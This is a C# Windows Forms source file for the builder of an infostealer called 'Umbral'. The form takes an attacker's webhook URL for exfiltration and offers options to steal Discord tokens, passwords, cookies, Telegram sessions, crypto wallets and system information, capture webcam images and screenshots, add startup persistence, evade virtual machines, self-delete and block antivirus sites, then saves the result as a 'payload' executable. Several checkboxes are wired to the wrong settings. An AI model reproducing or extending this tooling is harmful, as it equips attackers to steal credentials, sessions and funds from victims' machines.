using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Windows.Forms;
using Umbral.builder.Components.Build;


namespace Umbral.builder.Components.Forms
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent();
        }

        [DllImport("user32.dll")]
        static extern private int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

        [DllImport("user32.dll")]
        static extern private bool ReleaseCapture();

        private void Drag_On_Mousedown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, 0xA1, 0x2, 0);
            }
        }

        private void buttonClose_Click(object sender, EventArgs e)
        {
            Close(); 
        }

        private void buttonMinimize_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void RefreshControls()
        {
            Settings.Webhook = txtWebhook.Text;

            Settings.Ping = chkPing.Checked;
            Settings.Startup = chkStartup.Checked;
            Settings.AntiVm = chkAntiVm.Checked;
            Settings.Melt = chkMelt.Checked;
            Settings.BlockAvSites = chkBlockAvSites.Checked;

            Settings.StealDiscordTokens = chkDiscord.Checked;
            Settings.StealPasswords = chkPasswords.Checked;
            Settings.StealCookies = chkCookies.Checked;
            Settings.StealGames = chkGames.Checked;
            Settings.StealTelegramSessions = chkGames.Checked;
            Settings.StealSystemInfo = chkTelegram.Checked;
            Settings.StealWallets = chkWallets.Checked;
            Settings.TakeWebcamSnapshot = chkSystemInfo.Checked;
            Settings.TakeScreenshot = chkWallets.Checked;

            var isWebhookValid = (Settings.Webhook.StartsWith("http://") || Settings.Webhook.StartsWith("https://")) && Settings.Webhook.Contains(".");
            btnBuild.Enabled = (Settings.StealDiscordTokens || Settings.StealPasswords || Settings.StealCookies || Settings.StealGames || Settings.StealTelegramSessions || Settings.StealSystemInfo || Settings.StealWallets || Settings.TakeWebcamSnapshot || Settings.TakeScreenshot) && isWebhookValid;
        }

        private async void btnCheckWebhook_Click(object sender, EventArgs e)
        {
            if (txtWebhook.Text.Length == 0)
            {
                MessageBox.Show("Webhook cannot be empty.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
            }
            else if ((!txtWebhook.Text.StartsWith("https://") && !txtWebhook.Text.StartsWith("http://")) || !txtWebhook.Text.Contains("."))
            {
                MessageBox.Show("Webhook is invalid.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
            }
            else
            {
                btnCheckWebhook.Enabled = false;
                btnBuild.Enabled = false;
                txtWebhook.Enabled = false;

                try
                {
                    using (var client = new HttpClient())
                    {
                        var response = await client.GetAsync(txtWebhook.Text);
                        if (response.StatusCode == System.Net.HttpStatusCode.OK)
                        {
                            MessageBox.Show("The webhook seems to be valid.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        else
                        {
                            MessageBox.Show("The webhook seems to be invalid.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                        }
                    }
                } 
                catch (Exception)
                {
                    MessageBox.Show("Unable to connect to the webhook.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                }


                btnCheckWebhook.Enabled = true;
                txtWebhook.Enabled = true;
                RefreshControls();
            }
        }

        private void txtWebhook_TextChanged(object sender, EventArgs e)
        {
            RefreshControls();
        }

        private void CheckedChanged(object sender, Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs e)
        {
            RefreshControls();
        }

        private void btnIconSelect_Click(object sender, EventArgs e)
        {
            var tag = btnIconSelect.Tag as string;
            if (tag == "NoIcon")
            {
                using (var openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Filter = "Icon File (*.ico)|*.ico";
                    openFileDialog.Title = "Select Icon File";
                    openFileDialog.ValidateNames = true;
                    openFileDialog.CheckFileExists = true;
                    openFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        if (File.Exists(openFileDialog.FileName))
                        {
                            Settings.IconPath = openFileDialog.FileName;
                            btnIconSelect.Tag = "Icon";
                            btnIconSelect.Text = "Unselect Icon";
                        }
                    }
                }
            }
            else
            {
                btnIconSelect.Tag = "NoIcon";
                Settings.IconPath = string.Empty;
                btnIconSelect.Text = "Select Icon";
            }
        }

        private void btnModifyAssembly_Click(object sender, EventArgs e)
        {
            new AssemblyEditorForm().ShowDialog();
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            using (var saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "Executable File (*.exe)|*.exe";
                saveFileDialog.Title = "Save payload";
                saveFileDialog.FileName = "Umbral.exe";
                saveFileDialog.ValidateNames = true;

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    btnBuild.Enabled = false;
                    btnCheckWebhook.Enabled = false;
                    btnModifyAssembly.Enabled = false;
                    btnIconSelect.Enabled = false;
                    txtWebhook.Enabled = false;

                    var builder = new Builder();
                    builder.Build(saveFileDialog.FileName);

                    btnBuild.Enabled = true;
                    btnCheckWebhook.Enabled = true;
                    btnModifyAssembly.Enabled = true;
                    btnIconSelect.Enabled = true;
                    txtWebhook.Enabled = true;
                }
            }
        }

    }
}
